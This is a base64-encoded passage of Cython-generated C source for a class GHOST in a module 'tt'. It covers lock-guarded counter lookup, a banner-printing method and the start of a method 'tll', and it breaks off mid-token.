ICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3Zfc2VsZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xvY2spOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNzYsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgIF9fcHl4X3RfNCA9IE5VTEw7XG4gICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MM19lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICBfX3B5eF90XzYgPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAobGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNSkpKSB7XG4gICAgICBfX3B5eF90XzQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfNCk7XG4gICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzUsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBOVUxMfTtcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICB9XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgIHtcbiAgICAgIHtcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfOCwgJl9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgICB7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY291bnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDc3LCBfX3B5eF9MN19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICAgICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9HZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfdl9rZXkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA3NywgX19weXhfTDdfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICAgICAgX19weXhfciA9IF9fcHl4X3RfMztcbiAgICAgICAgICBfX3B5eF90XzMgPSAwO1xuICAgICAgICAgIGdvdG8gX19weXhfTDExX3RyeV9yZXR1cm47XG5cbiAgICAgICAgICBcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MN19lcnJvcjo7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgIHtcbiAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULmdldF9jb3VudGVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8zLCAmX19weXhfdF8xLCAmX19weXhfdF81KSA8IDApIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDlfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IFB5VHVwbGVfUGFjaygzLCBfX3B5eF90XzMsIF9fcHl4X3RfMSwgX19weXhfdF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNzYsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzIsIF9fcHl4X3RfNCwgTlVMTCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xMCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICBpZiAoX19weXhfdF8xMSA8ICgwKSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19weXhfdF8xMiA9ICghX19weXhfdF8xMSk7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KF9fcHl4X3RfMTIpKSB7XG4gICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZShfX3B5eF90XzMsIF9fcHl4X3RfMSwgX19weXhfdF81KTtcbiAgICAgICAgICAgIF9fcHl4X3RfMyA9IDA7ICBfX3B5eF90XzEgPSAwOyAgX19weXhfdF81ID0gMDsgXG4gICAgICAgICAgICBfX1BZWF9FUlIoMCwgNzYsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgZ290byBfX3B5eF9MOF9leGNlcHRpb25faGFuZGxlZDtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MOV9leGNlcHRfZXJyb3I6O1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzcsIF9fcHl4X3RfOCwgX19weXhfdF85KTtcbiAgICAgICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICAgICAgX19weXhfTDExX3RyeV9yZXR1cm46O1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzcsIF9fcHl4X3RfOCwgX19weXhfdF85KTtcbiAgICAgICAgZ290byBfX3B5eF9MNF9yZXR1cm47XG4gICAgICAgIF9fcHl4X0w4X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7XG4gICAgICB9XG4gICAgfVxuICAgICB7XG4gICAgICB7XG4gICAgICAgIGlmIChfX3B5eF90XzIpIHtcbiAgICAgICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0sIE5VTEwpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MMV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgICAgfVxuICAgICAgICBnb3RvIF9fcHl4X0w2O1xuICAgICAgfVxuICAgICAgX19weXhfTDRfcmV0dXJuOiB7XG4gICAgICAgIF9fcHl4X3RfOSA9IF9fcHl4X3I7XG4gICAgICAgIF9fcHl4X3IgPSAwO1xuICAgICAgICBpZiAoX19weXhfdF8yKSB7XG4gICAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdLCBOVUxMKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfciA9IF9fcHl4X3RfOTtcbiAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgICAgZ290byBfX3B5eF9MMDtcbiAgICAgIH1cbiAgICAgIF9fcHl4X0w2OjtcbiAgICB9XG4gICAgZ290byBfX3B5eF9MMTY7XG4gICAgX19weXhfTDNfZXJyb3I6O1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDE2OjtcbiAgfVxuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5nZXRfY291bnRlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF81R0hPU1RfOWNyZWF0ZV9iYW5uZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMnR0XzVHSE9TVF85Y3JlYXRlX2Jhbm5lciA9IHsiY3JlYXRlX2Jhbm5lciIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMnR0XzVHSE9TVF85Y3JlYXRlX2Jhbm5lciwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF85Y3JlYXRlX2Jhbm5lcihQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKSB7XG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzO1xuICAjZW5kaWZcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzO1xuICBQeU9iamVjdCogdmFsdWVzWzFdID0gezB9O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImNyZWF0ZV9iYW5uZXIgKHdyYXBwZXIpIiwgMCk7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTtcbiAgI2Vsc2VcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDtcbiAgI2VuZGlmXG4gICNlbmRpZlxuICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAge1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbGYsMH07XG4gICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCA3OSwgX19weXhfTDNfZXJyb3IpXG4gICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkge1xuICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykge1xuICAgICAgICBjYXNlICAxOlxuICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAwOiBicmVhaztcbiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICAgIH1cbiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7XG4gICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiY3JlYXRlX2Jhbm5lciIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNzksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDE7IGkrKykge1xuICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImNyZWF0ZV9iYW5uZXIiLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MM19lcnJvcikgfVxuICAgICAgfVxuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHtcbiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgfSBlbHNlIHtcbiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MM19lcnJvcilcbiAgICB9XG4gICAgX19weXhfdl9zZWxmID0gdmFsdWVzWzBdO1xuICB9XG4gIGdvdG8gX19weXhfTDZfc2tpcDtcbiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6O1xuICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiY3JlYXRlX2Jhbm5lciIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MM19lcnJvcilcbiAgX19weXhfTDZfc2tpcDo7XG4gIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7XG4gIF9fcHl4X0wzX2Vycm9yOjtcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULmNyZWF0ZV9iYW5uZXIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8ydHRfNUdIT1NUXzhjcmVhdGVfYmFubmVyKF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZik7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0dF81R0hPU1RfOGNyZWF0ZV9iYW5uZXIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9zZWxmKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF8zO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjcmVhdGVfYmFubmVyIiwgMCk7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IE5VTEw7XG4gIF9fcHl4X3RfMyA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X2J1aWx0aW5fcHJpbnQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDEtX19weXhfdF8zKSB8IChfX3B5eF90XzMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDgwLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcblxuICBcblxuICBcbiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5jcmVhdGVfYmFubmVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8xMXRsbChQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKTsgXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydHRfNUdIT1NUXzExdGxsID0geyJ0bGwiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJ0dF81R0hPU1RfMTF0bGwsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF81R0hPU1RfMTF0bGwoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbikge1xuICBQeU9iamVjdCAqX19weXhfdl9zZWxmID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgUHlP